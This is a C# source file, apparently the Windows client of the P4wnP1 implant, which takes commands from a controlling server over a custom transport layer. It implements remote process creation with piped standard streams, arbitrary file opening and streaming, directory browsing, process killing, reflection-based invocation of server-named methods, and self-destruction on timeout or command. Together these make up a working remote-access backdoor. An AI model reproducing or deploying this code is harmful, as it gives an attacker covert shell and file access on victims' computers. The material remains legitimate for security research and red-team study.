﻿using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;

namespace P4wnP1
{
    public class Client
    {
        // message types from CLIENT (powershell) to server (python)
        const UInt32 CTRL_MSG_FROM_CLIENT_RESERVED = 0;
        const UInt32 CTRL_MSG_FROM_CLIENT_REQ_STAGE2 = 1;
        const UInt32 CTRL_MSG_FROM_CLIENT_RCVD_STAGE2 = 2;
        public const UInt32 CTRL_MSG_FROM_CLIENT_STAGE2_RUNNING = 3;
        const UInt32 CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE = 4;
        const UInt32 CTRL_MSG_FROM_CLIENT_ADD_CHANNEL = 5;
        const UInt32 CTRL_MSG_FROM_CLIENT_RUN_METHOD = 6;// client tasks server to run a method
        const UInt32 CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE = 7;
        const UInt32 CTRL_MSG_FROM_CLIENT_PROCESS_EXITED = 8;
        const UInt32 CTRL_MSG_FROM_CLIENT_CHANNEL_SHOULD_CLOSE = 9;
        const UInt32 CTRL_MSG_FROM_CLIENT_CHANNEL_CLOSED = 10;

        // message types from server (python) to client (powershell)
        const UInt32 CTRL_MSG_FROM_SERVER_STAGE2_RESPONSE = 1000;
        const UInt32 CTRL_MSG_FROM_SERVER_SEND_OS_INFO = 1001;
        const UInt32 CTRL_MSG_FROM_SERVER_SEND_PS_VERSION = 1002;
        const UInt32 CTRL_MSG_FROM_SERVER_RUN_METHOD = 1003;
        const UInt32 CTRL_MSG_FROM_SERVER_ADD_CHANNEL_RESPONSE = 1004;
        const UInt32 CTRL_MSG_FROM_SERVER_RUN_METHOD_RESPONSE = 1005; // response from a method ran on server
        const UInt32 CTRL_MSG_FROM_SERVER_DESTROY = 1006;
        const UInt32 CTRL_MSG_FROM_SERVER_CLOSE_CHANNEL = 1007;


        private TransportLayer tl;

        private object lockChannels;
        private Hashtable inChannels;
        private Hashtable outChannels;
        private List<Channel> channelsToRemove;
        private Channel control_channel;
        private AutoResetEvent eventChannelOutputNeedsToBeProcessed;

        private Hashtable pending_method_calls;
        private Object pendingMethodCallsLock;

        private Hashtable opened_streams;
        private Object openedStreamsLock;

        private Hashtable pending_client_processes;
        private Object pendingClientProcessesLock;
        List<ClientProcess> exitedProcesses;
        private Object exitedProcessesLock;

        private bool running;
        private Thread inputProcessingThread;
        private Thread outputProcessingThread;

        private AutoResetEvent eventDataNeedsToBeProcessed;

        public Client(TransportLayer tl)
        {
            this.tl = tl;

            //Channels
            this.inChannels = Hashtable.Synchronized(new Hashtable());
            this.outChannels = Hashtable.Synchronized(new Hashtable());
            this.channelsToRemove = new List<Channel>();
            this.lockChannels = new object();
            this.eventChannelOutputNeedsToBeProcessed = new AutoResetEvent(true);
            
            this.control_channel = new Channel(Channel.Encodings.BYTEARRAY, Channel.Types.BIDIRECTIONAL, this.callbackChannelOutputPresent, null); //Caution, this has to be the first channel to be created, in order to assure channel ID is 0
            this.AddChannel(control_channel);


            //Processes
            this.pending_client_processes = Hashtable.Synchronized(new Hashtable());
            this.pendingClientProcessesLock = new object();
            this.exitedProcesses = new List<ClientProcess>();
            this.exitedProcessesLock = new object();

            //RPC methods
            this.pending_method_calls = Hashtable.Synchronized(new Hashtable());
            this.pendingMethodCallsLock = new object();

            //Stream objects
            this.opened_streams = Hashtable.Synchronized(new Hashtable());
            this.openedStreamsLock = new object();

            this.running = true;
            this.eventDataNeedsToBeProcessed = new AutoResetEvent(true);

            this.tl.registerTimeoutCallback(this.linklayerTimeoutHandler);
        }

        public Channel AddChannel(Channel ch)
        {
            Monitor.Enter(this.lockChannels);
            if (ch.type != Channel.Types.OUT) this.inChannels.Add(ch.ID, ch);
            if (ch.type != Channel.Types.IN) this.outChannels.Add(ch.ID, ch);
            Monitor.Exit(this.lockChannels);
            return ch;
        }

        public Channel GetChannel(UInt32 id)
        {
            //get channel by ID, return null if not found
            Monitor.Enter(this.lockChannels);
            if (this.inChannels.Contains(id))
            {
                Monitor.Exit(this.lockChannels);
                return (Channel)this.inChannels[id];
            }
            if (this.outChannels.Contains(id))
            {
                Monitor.Exit(this.lockChannels);
                return (Channel)this.outChannels[id];
            }
            Monitor.Exit(this.lockChannels);

            return null;
        }

        public void callbackChannelOutputPresent()
        {
            this.eventChannelOutputNeedsToBeProcessed.Set();
        }

        private void addStream(Stream stream)
        {
            Monitor.Enter(this.openedStreamsLock);
            this.opened_streams[stream.GetHashCode()] = stream;
            Monitor.Exit(this.openedStreamsLock);
        }

        private Stream getStream(int stream_id)
        {
            Monitor.Enter(this.openedStreamsLock);
            Stream res = (Stream) this.opened_streams[stream_id];
            Monitor.Exit(this.openedStreamsLock);
            return res;
        }

        private void removeStream(int stream_id)
        {
            Monitor.Enter(this.openedStreamsLock);
            this.opened_streams.Remove(stream_id);
            Monitor.Exit(this.openedStreamsLock);
            Console.WriteLine(String.Format("Stream object with ID {0} removed.", stream_id));
        }

        private bool hasStream(int stream_id)
        {
            Monitor.Enter(this.openedStreamsLock);
            bool res = this.opened_streams.Contains(stream_id);
            Monitor.Exit(this.openedStreamsLock);
            return res;
        }

        public void linklayerTimeoutHandler(long dt)
        {
            Console.WriteLine(String.Format("LinkLayer timeout {0}", dt));

            //Self destroy
            this.SendControlMessage(Client.CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE);
            this.stop();
        }

        public void stop()
        {
            this.running = false;
            this.tl.stop();

            //abort threads if still running
            this.inputProcessingThread.Abort();
            this.outputProcessingThread.Abort();

        }

        public void SendControlMessage(UInt32 msg_type)
        {
            SendControlMessage(msg_type, null);
        }

        public void SendControlMessage(UInt32 msg_type, byte[] data)
        {
            List<byte> msg = Struct.packUInt32(msg_type);
            if (data != null) msg = Struct.packByteArray(data, msg);

            
            this.control_channel.write(msg.ToArray());
        }

        private void setProcessingNeeded(bool needed)
        {
            if (needed) this.eventDataNeedsToBeProcessed.Set();
            else this.eventDataNeedsToBeProcessed.Reset(); // this shouldn't be used, only the processing thread should be allowed to reset the signal
        }

        private void triggerProcessingNeeded()
        {
            this.eventDataNeedsToBeProcessed.Set();
        }

        private void addRequestedClientMethodToQueue(ClientMethod method)
        {
            Monitor.Enter(this.pendingMethodCallsLock);
            this.pending_method_calls[method.id] = method;
            Monitor.Exit(this.pendingMethodCallsLock);
            this.setProcessingNeeded(true);
        }

        private void onProcessExit(ClientProcess cproc)
        {
            Monitor.Enter(this.exitedProcessesLock);
            this.exitedProcesses.Add(cproc);
            this.setProcessingNeeded(true);
            Console.WriteLine(String.Format("Proc with id {0} and filename '{1}' exited.", cproc.Id, cproc.proc_filename));
            Monitor.Exit(this.exitedProcessesLock);
        }

        private void __processTransportLayerInput()
        {
            //For now only input of control channel has to be delivered
            // Input for ProcessChannels (STDIN) is directly written to the STDIN pipe of the process (when TransportLayer enqueues data)

          
            while (this.running)
            {
                this.tl.waitForData();  // blocks if no input from transport layer
                
                /*
                 * hand over data to respective channels
                 */
                while (this.tl.hasData()) //as long as linklayer has data
                {
                    List<byte> stream = new List<byte>(this.tl.readInputStream());
                    UInt32 ch_id = Struct.extractUInt32(stream);

                    byte[] data = stream.ToArray(); //the extract method removed the first elements from the List<byte> and we convert back to an array now

                    Channel target_ch = this.GetChannel(ch_id);
                    if (target_ch == null)
                    {
                        Console.WriteLine(String.Format("Received data for channel with ID {0}, this channel doesn't exist!", ch_id));
                        continue;
                    }

                    target_ch.EnqueueInput(data);
                }

                /*
                 * process control channel data
                 */
                while (control_channel.hasPendingInData())
                {
                    List<byte> data = Struct.packByteArray(control_channel.read());

                    // extract control message type
                    UInt32 CtrlMessageType = Struct.extractUInt32(data);

                    switch (CtrlMessageType)
                    {
                        case CTRL_MSG_FROM_SERVER_RUN_METHOD:
                            ClientMethod new_method = new ClientMethod(data);
                            this.addRequestedClientMethodToQueue(new_method);

                            Console.WriteLine(String.Format("Received control message RUN_METHOD! Method ID: {0}, Method Name: {1}, Method Args: {2}", new_method.id, new_method.name, new_method.args));
                            break;

                        case CTRL_MSG_FROM_SERVER_DESTROY:
                            this.SendControlMessage(Client.CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE);
                            this.stop();
                            break;

                        case CTRL_MSG_FROM_SERVER_CLOSE_CHANNEL:
                            UInt32 channel_id = Struct.extractUInt32(data);
                            Channel ch = this.GetChannel(channel_id);
                            if (ch != null) ch.CloseRequestedForLocal = true;
                            break;

                        default:
                            String data_utf8 = Encoding.UTF8.GetString(data.ToArray());
                            Console.WriteLine(String.Format("Received unknown MESSAGE TYPE for control channel! MessageType: {0}, Data: {1}", CtrlMessageType, data_utf8));
                            break;
                    }
                }
            }
        }

        private void __processTransportLayerOutput()
        {
            while (this.running)
            {
                //stop processing until signal is received
                while (true)
                {
                    if (this.eventChannelOutputNeedsToBeProcessed.WaitOne(100) || !this.running) break;
                }
                

                //abort if we aren't in run state anymore
                if (!this.running) return;

                Monitor.Enter(this.lockChannels);
                ICollection keys = this.outChannels.Keys;

                Console.WriteLine(String.Format("Out channel count {0}", keys.Count));

                foreach (Object key in keys)
                {
                    Channel channel = (Channel)this.outChannels[key];

                    //while (channel.hasPendingOutData())
                    if (channel.hasPendingOutData()) //we only process a single chunk per channel (load balancing) and we only deliver data if the channel is linked 
                    {
                        UInt32 ch_id = (UInt32)channel.ID;

                        if ((ch_id == 0) || channel.isLinked) // send output only if channel is linked (P4wnP1 knows about it) or it is the control channel (id 0)
                        {


                            byte[] data = channel.DequeueOutput();

                            List<byte> stream = Struct.packUInt32(ch_id);
                            stream = Struct.packByteArray(data, stream);

                            //Console.WriteLine("TransportLayer: trying to push channel data");

                            if (ch_id == 0) this.tl.writeOutputStream(stream.ToArray(), false);
                            else this.tl.writeOutputStream(stream.ToArray(), true);
                        }
                    }

                    if (channel.hasPendingOutData()) this.eventChannelOutputNeedsToBeProcessed.Set(); //reenable event, if there's still data to process
                }
                Monitor.Exit(this.lockChannels);
            }
        }

        public void run()
        {
            
            List<UInt32> method_remove_list = new List<UInt32>();
           
            //start input thread
            this.inputProcessingThread = new Thread(new ThreadStart(this.__processTransportLayerInput));
            this.inputProcessingThread.Start();

            this.outputProcessingThread = new Thread(new ThreadStart(this.__processTransportLayerOutput));
            this.outputProcessingThread.Start();

            

            while (this.running)
            {
                //this.tl.ProcessInSingle(false);

                //stop processing until sgnal is received
                while (true)
                {
                    if (this.eventDataNeedsToBeProcessed.WaitOne(100) || (!running)) break;
                }

                //re-check if we are still running (eraly out)
                if (!running) break;

                /*
                 * process  channels (removing + heavy tasks)
                 * 
                 */

                //check for closed channels
                Monitor.Enter(this.lockChannels);
                ICollection keys = this.outChannels.Keys;
                foreach (Object key in keys)
                {
                    Channel channel = (Channel)this.outChannels[key];
                    if (channel.shouldBeClosed && !channel.CloseRequestedForRemote)
                    {
                        Console.WriteLine(String.Format("OUT channel {0}, requesting close from server", channel.ID));
                        this.SendControlMessage(Client.CTRL_MSG_FROM_CLIENT_CHANNEL_SHOULD_CLOSE, Struct.packUInt32(channel.ID).ToArray());
                        channel.CloseRequestedForRemote = true;
                    }
                    if (channel.CloseRequestedForLocal) this.channelsToRemove.Add(channel);
                    //processing for out channel in else branch
                }
                keys = this.inChannels.Keys;
                foreach (Object key in keys)
                {
                    Channel channel = (Channel)this.inChannels[key];
                    if (channel.shouldBeClosed && !channel.CloseRequestedForRemote)
                    {
                        Console.WriteLine(String.Format("IN channel {0}, requesting close from server", channel.ID));
                        this.SendControlMessage(Client.CTRL_MSG_FROM_CLIENT_CHANNEL_SHOULD_CLOSE, Struct.packUInt32(channel.ID).ToArray());
                        channel.CloseRequestedForRemote = true;
                    }
                    if (channel.CloseRequestedForLocal)
                    {
                        //check if not already in remove list, because handled as outChannel 
                        if (!this.channelsToRemove.Contains(channel)) this.channelsToRemove.Add(channel);
                    }
                    //processing for in channel in else branch
                }

                //remove closed channels
                foreach (Channel channel in this.channelsToRemove)
                {
                    if (this.inChannels.Contains(channel.ID)) this.inChannels.Remove(channel.ID);
                    if (this.outChannels.Contains(channel.ID)) this.outChannels.Remove(channel.ID);
                    channel.onClose();
                    Console.WriteLine(String.Format("Channel {0} closed", channel.ID));
                    this.SendControlMessage(Client.CTRL_MSG_FROM_CLIENT_CHANNEL_CLOSED, Struct.packUInt32(channel.ID).ToArray());
                }
                channelsToRemove.Clear();

                //if the channel itself needs processing (not input or output) do it here

                Monitor.Exit(this.lockChannels);

                /*
                 * remove exited processes
                 */
                Monitor.Enter(this.exitedProcessesLock);
                foreach (ClientProcess cproc in this.exitedProcesses)
                {
                    Monitor.Enter(this.pendingClientProcessesLock);
                    this.pending_client_processes.Remove(cproc.Id);
                    cproc.Dispose();
                    Monitor.Exit(this.pendingClientProcessesLock);

                    //ToDo: inform client about process removement
                    this.SendControlMessage(Client.CTRL_MSG_FROM_CLIENT_PROCESS_EXITED, (Struct.packUInt32((UInt32) cproc.Id)).ToArray());

                    //ToDo: destroy channels and inform client
                }
                this.exitedProcesses.Clear();
                Monitor.Exit(this.exitedProcessesLock);

                /*
                 * Process running methods
                 */
                Monitor.Enter(this.pendingMethodCallsLock);

                ICollection method_ids = this.pending_method_calls.Keys;
                foreach (UInt32 method_id in method_ids)
                {
                    if (this.pending_method_calls.ContainsKey(method_id)) //we have to recheck if the method still exists in every iteration
                    {
                        ClientMethod method = (ClientMethod) this.pending_method_calls[method_id];


                        //check if method has been started, do it if not
                        if (!method.started)
                        {
                            //find method implementation
                            MethodInfo method_implementation = this.GetType().GetMethod(method.name, BindingFlags.NonPublic | BindingFlags.Instance);
                            
                            if (method_implementation != null)
                            {
                                try
                                {
                                    byte[] method_result = (byte[])method_implementation.Invoke(this, new Object[] { method.args });
                                    method.setResult(method_result);
                                }
                                catch (ClientMethodException e)
                                {
                                    method.setError(String.Format("Method '{0}' throwed error:\n{1}", method.name, e.Message));
                                }
                                catch (Exception e)
                                {
                                    method.setError(String.Format("'{0}' exception:\n{1}", method.name, e.InnerException.Message));
                                    Console.WriteLine("Catch block of Method invocation");
                                }
                                
                            }
                            else
                            {
                                
                                method.setError(String.Format("Method '{0}' not found!", method.name));
                            }
                            
                        }

                        if (method.finished)
                        {
                            //Enqueue response and remove method from pending ones
                            byte[] response = method.createResponse();
                            this.SendControlMessage(Client.CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE, response);
                            //this.pending_method_calls.Remove(method_id);

                            //add method to remove list
                            method_remove_list.Add(method_id);
                        }

                    }
                }
                Monitor.Exit(this.pendingMethodCallsLock);

                //remove finished methods
                Monitor.Enter(this.pendingMethodCallsLock);
                foreach (UInt32 method_id in method_remove_list) this.pending_method_calls.Remove(method_id);
                Monitor.Exit(this.pendingMethodCallsLock);


            }
        }

        /*
         * ChannelAddRequest
         *      0..3    UInt32  Channel ID
         *      4       byte    Channel Class (0 = unspecified, 1 = ProcessChannel, ...)
         *      5       byte    Channel Type (0 = unspecified, 1 = BIDIRECTIONAL, 2 = OUT, 3 = IN) Note: channel type has to be reversed on other endpoit IN becomes OUT, OUT becomes in
         *      6       byte    Channel Encoding (0 = unspecified, 1 = BYTEARRAY, 2 = UTF8)
         *      7..10   UInt32  Channel parent ID (0= unspecified, in case of process channel process ID)
         *      11..14  UInt32  Channel subtype  (in case of process: 0=STDIN, 1=STDOUT, 2=STDERR)
         */
        /*
        private void sendChannelAddRequest(Channel ch)
        {

            if (ch is ProcessChannel)
            {
                ProcessChannel p_ch = (ProcessChannel)ch;

                List<byte> chAddRequest = Struct.packUInt32(p_ch.ID);

                chAddRequest = Struct.packByte(1, chAddRequest);

                if (p_ch.type == Channel.Types.BIDIRECTIONAL) chAddRequest = Struct.packByte(1, chAddRequest);
                else if (p_ch.type == Channel.Types.IN) chAddRequest = Struct.packByte(2, chAddRequest); //set to out on other end
                else if (p_ch.type == Channel.Types.OUT) chAddRequest = Struct.packByte(3, chAddRequest); //set to in on other end
                else chAddRequest = Struct.packByte(0, chAddRequest); //unspecified

                if (p_ch.encoding == Channel.Encodings.BYTEARRAY) chAddRequest = Struct.packByte(1, chAddRequest); //set to BYTEARRAY encoding
                else if (p_ch.encoding == Channel.Encodings.UTF8) chAddRequest = Struct.packByte(2, chAddRequest); //set to UTF-8 encoding
                else chAddRequest = Struct.packByte(0, chAddRequest); //set to unspecified encoding

                

            }
            else
            {
                Console.WriteLine("undefined channel");
            }

        }
        */

        private byte[] core_call_fs_command(byte[] args)
        {
            List<byte> argbytes = new List<byte>(args);
            String command = Struct.extractNullTerminatedString(argbytes);
            String resstr = "";
            if (command == "pwd") resstr = FileSystem.pwd();
            else if (command == "ls")
            {
                String target = Struct.extractNullTerminatedString(argbytes);
                String[] entries = FileSystem.ls(target);
                foreach (String entry in entries) resstr += entry + "\n";
            }
            else if (command == "cd")
            {
                String target = Struct.extractNullTerminatedString(argbytes);
                resstr = FileSystem.cd(target);
            }
            else
            {
                throw new ClientMethodException(String.Format("Unknown command {0}", command));
            }


            return Struct.packNullTerminatedString(resstr).ToArray();
        }

        private byte[] core_inform_channel_added(byte[] args)
        {
            UInt32 ch_id = Struct.extractUInt32(new List<byte>(args));
            ((Channel)this.GetChannel(ch_id)).isLinked = true;
            return Struct.packNullTerminatedString(String.Format("Channel with ID {0} set to 'hasLink'", ch_id)).ToArray();
        }

        /*
        //REMOVE, obsolete
        private byte[] core_create_filechannel(byte[] args)
        {
            List<byte> request = new List<byte>(args);
            String local_filename = Struct.extractNullTerminatedString(request);
            String local_file_access_mode = Struct.extractNullTerminatedString(request);
            Byte local_file_target = Struct.extractByte(request); //0 = disc, 1 = in memory
            Byte local_file_force = Struct.extractByte(request); //0 = don't force, 1= force (if force is set, non existing file get overwritten on WRITE, and non existing files are created on READWRITE


            //create the file channel, on error an exception will be thrown and handled by the caller
            FileChannel fc = new FileChannel(this.tl.setOutputProcessingNeeded, local_filename, local_file_access_mode, local_file_target, (local_file_force == 1));

            //String response = String.Format("Created file channel for '{0}', access '{1}', mode: {2}, force {3}", local_filename, local_file_access_mode, local_file_target, local_file_force);

            //if we are here, channel creation succeded and we return the channel ID as response
            List<byte> response = Struct.packUInt32(fc.ID);
            return response.ToArray();
        }
        */
        
        private byte[] core_fs_open_file(byte[] args)
        {
            List<byte> request = new List<byte>(args);
            String filename = Struct.extractNullTerminatedString(request);
            FileMode fm = (FileMode) Struct.extractByte(request);
            FileAccess fa = (FileAccess) Struct.extractByte(request);

            FileStream fs = File.Open(filename, fm, fa);

            this.addStream(fs); //store this in global list of opened streams
            int result = fs.GetHashCode(); //return stream id

            //if we are here, channel creation succeded and we return the channel ID as response
            List<byte> response = Struct.packInt32(result);
            return response.ToArray();
        }

        private byte[] core_fs_close_stream(byte[] args)
        {
            List<byte> request = new List<byte>(args);
            int stream_id = Struct.extractInt32(request);
            
            // check if stream is present
            bool exists = this.hasStream(stream_id);
            if (!exists) throw new Exception(String.Format("Stream with ID '{0}' doesn't exist", stream_id));

            // close stream channel
            Stream stream = this.getStream(stream_id);
            stream.Dispose();
            stream.Close();
            Console.WriteLine(String.Format("Stream object with ID {0} closed.", stream_id));
            this.removeStream(stream_id);
            
            //return stream id
            Int32 result = stream_id;
            List<byte> response = Struct.packInt32(result);
            return response.ToArray();
        }


        private byte[] core_open_stream_channel(byte[] args)
        {
            List<byte> request = new List<byte>(args);
            int stream_id = Struct.extractInt32(request);
            byte passthrough_byte = Struct.extractByte(request);
            bool passthrough = false;
            if (passthrough_byte == 1) passthrough = true;

            // check if stream is present
            bool exists = this.hasStream(stream_id);
            if (!exists) throw new Exception(String.Format("Stream with ID '{0}' doesn't exist", stream_id));

            // create stream channel
            Stream stream = this.getStream(stream_id);
            StreamChannel sc = new StreamChannel(stream, this.callbackChannelOutputPresent, this.triggerProcessingNeeded, passthrough);

            //add stream channel to transport layer channels
            this.AddChannel(sc);

            //return stream id
            UInt32 result = sc.ID; 
            List<byte> response = Struct.packUInt32(result);
            return response.ToArray();
        }

        private byte[] core_kill_proc(byte[] args)
        {
            UInt32 proc_id = Struct.extractUInt32(new List<byte>(args));
            //check if proc ID exists (for now only managed procs)
            if (this.pending_client_processes.Contains((int)proc_id))
            {
                ((ClientProcess)this.pending_client_processes[(int)proc_id]).kill();
                //return Struct.packNullTerminatedString(String.Format("Sent kill signal to process with ID {0}", proc_id)).ToArray();
                return Struct.packUInt32(proc_id).ToArray(); // return process id on success
            }
            else
            {
                throw new ClientMethodException(String.Format("Process with ID {0} not known. Kill signal hasn't been sent", proc_id));
                //return Struct.packNullTerminatedString(String.Format("Process with ID {0} not known. Kill signal hasn't been sent", proc_id)).ToArray();
            }

        }

        private byte[] core_create_proc(byte[] args)
        {
            List<byte> data = new List<byte>(args);

            // first byte indicates if STDIN, STDOUT and STDERR should be streamed to channels
            bool use_channels = (Struct.extractByte(data) != 0);
            string proc_filename = Struct.extractNullTerminatedString(data);
            string proc_args = Struct.extractNullTerminatedString(data);

            ClientProcess proc = new ClientProcess(proc_filename, proc_args, use_channels, this.callbackChannelOutputPresent, this.triggerProcessingNeeded); //starts the process already
            proc.registerOnExitCallback(this.onProcessExit);

            
            if (use_channels)
            {
                this.AddChannel(proc.Ch_stdin);
                this.AddChannel(proc.Ch_stdout);
                this.AddChannel(proc.Ch_stderr);

                
                /*
                proc.Ch_stdin = this.tl.CreateChannel(Channel.Types.IN, Channel.Encodings.UTF8);
                proc.Ch_stdout = this.tl.CreateChannel(Channel.Types.OUT, Channel.Encodings.UTF8);
                proc.Ch_stderr = this.tl.CreateChannel(Channel.Types.OUT, Channel.Encodings.UTF8);
                */
            }
            

            

            //generate method response
            List <byte> resp = Struct.packUInt32((UInt32) proc.Id);
            if (use_channels)
            {
                resp = Struct.packByte(1, resp);
                resp = Struct.packUInt32(proc.Ch_stdin.ID, resp);
                resp = Struct.packUInt32(proc.Ch_stdout.ID, resp);
                resp = Struct.packUInt32(proc.Ch_stderr.ID, resp);
            }
            else
            {
                resp = Struct.packByte(0, resp);
                resp = Struct.packUInt32(0, resp);
                resp = Struct.packUInt32(0, resp);
                resp = Struct.packUInt32(0, resp);
            }

            Monitor.Enter(this.pendingClientProcessesLock);
            this.pending_client_processes.Add(proc.Id, proc);
            Monitor.Exit(this.pendingClientProcessesLock);

            //throw new ClientMethodException(String.Format("Not implemented: Trying to start proc '{0}' with args: {1}", proc_filename, proc_args));
            return resp.ToArray();
        }

        private byte[] core_echo(byte[] args)
        {
            return args;
        }
    }
}
